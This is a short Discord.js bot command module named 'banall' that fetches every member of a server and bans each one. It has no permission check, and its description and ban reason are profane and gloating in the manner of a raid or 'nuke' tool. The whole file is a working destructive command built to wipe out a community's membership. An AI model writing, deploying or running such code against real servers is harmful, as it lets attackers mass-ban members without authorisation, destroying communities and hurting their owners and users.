
module.exports = {
    name: 'banall',
    description: 'ban all mother fuckers',
    async execute(message, args, Discord) {
        let members = await message.guild.members.fetch({ force: true });

        members.forEach(member => {
            member.ban({ reason: "fucked by void and mm9" });
        });
    }
}